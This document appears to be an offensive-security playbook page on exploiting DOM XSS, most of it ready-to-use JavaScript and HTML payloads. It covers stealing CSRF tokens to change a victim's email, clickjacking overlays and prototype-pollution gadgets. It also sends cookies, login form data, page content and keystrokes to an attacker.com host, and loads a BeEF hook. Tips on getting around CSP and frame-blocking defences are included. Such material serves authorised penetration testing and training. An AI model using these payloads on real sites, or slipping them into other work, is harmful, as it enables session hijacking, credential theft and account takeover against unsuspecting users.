# DOM XSS — Exfiltration and Vulnerability Chaining

## When this applies

After confirming a DOM XSS, you need to demonstrate impact: chain with CSRF for state-changing actions, layer with clickjacking, combine with prototype pollution, or exfiltrate sensitive data (cookies, credentials, page content) to prove exploitability.

> Note: For dedicated XSS-exploitation patterns (cookie theft, password capture, keylogging, etc.) see `../xss/`. This file focuses on chaining DOM XSS with other vulnerability classes.

## Technique

### Chaining Multiple Vulnerabilities

#### DOM XSS + CSRF

**Scenario:** Use DOM XSS to perform state-changing actions

```html
<!-- Steal CSRF token and submit form -->
<img src=x onerror="
    let token = document.querySelector('[name=csrf]').value;
    fetch('/api/change-email', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email: 'attacker@evil.com', csrf: token})
    });
">
```

#### DOM XSS + Clickjacking

**Exploit server:**
```html
<style>
    iframe { position:absolute; width:100%; height:100%; opacity:0.1; }
    button { position:absolute; top:300px; left:400px; z-index:-1; }
</style>
<iframe src="https://target.com/?xss=<img src=x onerror=alert(1)>"></iframe>
<button>Click me for prize!</button>
```

#### Prototype Pollution + DOM XSS

**Step 1 - Pollute:**
```
/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

**Step 2 - Trigger gadget:**
```javascript
let div = document.createElement('div');
if (div.innerHTML) { // Polluted property!
    // Some code that uses it
}
```

### Exfiltration Techniques

#### Cookie Theft

**Simple fetch:**
```javascript
fetch('https://attacker.com?c='+document.cookie)
```

**Image tag:**
```javascript
new Image().src='https://attacker.com?c='+document.cookie
```

**Form submission:**
```javascript
let f=document.createElement('form');
f.action='https://attacker.com';
f.method='POST';
let i=document.createElement('input');
i.name='cookies';
i.value=document.cookie;
f.appendChild(i);
document.body.appendChild(f);
f.submit();
```

#### Credential Harvesting

**Replace login form:**
```javascript
document.forms[0].action='https://attacker.com/steal';
```

**Add event listener:**
```javascript
document.querySelector('form').addEventListener('submit', e => {
    fetch('https://attacker.com', {
        method: 'POST',
        body: new FormData(e.target)
    });
});
```

#### Page Content Exfiltration

**Send full HTML:**
```javascript
fetch('https://attacker.com', {
    method: 'POST',
    body: document.documentElement.outerHTML
});
```

**Send specific elements:**
```javascript
let sensitiveData = document.querySelector('.user-profile').innerHTML;
fetch('https://attacker.com?data='+btoa(sensitiveData));
```

### Keylogging

```javascript
document.addEventListener('keypress', e => {
    fetch('https://attacker.com?key='+e.key);
});
```

### BeEF Integration

```javascript
let s=document.createElement('script');
s.src='https://attacker.com:3000/hook.js';
document.body.appendChild(s);
```

## Verifying success

- Chained CSRF: server state changes (email updated, password changed). Confirm by reading state via API.
- Chained clickjacking: victim's click on the visible button performs the iframe action. Test with browser automation.
- Pollution + DOM XSS: pollution payload alone has no effect; gadget alone has no effect; combined → execution.
- Exfiltration: attacker server logs receive payload. Verify with Burp Collaborator or netcat listener.

## Common pitfalls

1. **CSP `connect-src 'self'`** — fetch to attacker.com blocked. Use `<img>` GET or look for whitelisted domains in CSP.
2. **CSRF token rotates per-request** — extract fresh token *just before* submitting the state-changing request, not at payload load time.
3. **Clickjacking blocked by `X-Frame-Options: DENY`** — iframe won't load. Look for endpoints without the header (subpaths, error pages).
4. **Pollution chain too long** — payloads with deeply nested escapes are fragile. Test each stage in isolation.
5. **Exfiltration fails silently** — `mode: 'no-cors'` swallows errors; verify on receiving end before assuming success.

## Tools

- **Burp Collaborator** — receive exfiltration callbacks
- **DevTools Network → "Has response"** — verify exfil request fired
- **`curl` listener / `python3 -m http.server`** — quick attacker endpoint
- **BeEF** — post-exploitation framework (see `../xss/beef-integration.md`)
- **PortSwigger exploit server** — host clickjacking iframe overlays

## Related

- `../xss/cookie-theft.md`, `../xss/password-capture.md`, `../xss/csrf-via-xss.md`, `../xss/keylogging.md`, `../xss/data-exfiltration.md`, `../xss/session-hijacking.md`, `../xss/beef-integration.md` — dedicated exfiltration and post-exploitation scenarios
- `../prototype-pollution/` — prototype pollution techniques (when chaining)
- `../../clickjacking-cheat-sheet.md` — clickjacking primitives (when chaining)
